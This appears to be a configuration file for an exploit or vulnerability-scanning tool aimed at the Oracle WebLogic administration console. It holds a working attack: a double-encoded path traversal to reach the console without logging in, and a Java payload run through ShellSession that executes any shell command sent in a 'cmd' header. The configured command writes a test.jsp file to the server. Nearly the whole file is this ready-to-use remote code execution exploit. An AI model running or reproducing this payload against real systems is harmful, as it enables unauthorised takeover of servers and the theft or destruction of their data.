[set]

[rules-req01]
method = POST
cmd = echo "1111" > /u01/oracle/user_projects/domains/base_domain/../../../wlserver/server/lib/consoleapp/webapp/images/test.jsp
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0', 'cmd': '%(cmd)s', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded'}
path = /console/css/%252e%252e%252fconsole.portal
body = _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
	weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
	java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
	field.setAccessible(true);
	Object obj = field.get(adapter);
	weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
	String cmd = req.getHeader("cmd");
	String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
	if (cmd != null) {
	String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
	weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
	res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
	res.getServletOutputStream().flush();
	res.getWriter().write("");
	}executeThread.interrupt();
	");
expression = 72ad976ad5d491ad

[all_path]
windows_path_cmd = echo %PWD%
linux_path_cmd = echo $PWD
access_path = /console/images/
whrite_path = /../../../wlserver/server/lib/consoleapp/webapp/images/
expression = <html
follow_redirects = true

[detail]
author = rocky
links = 91xx.org

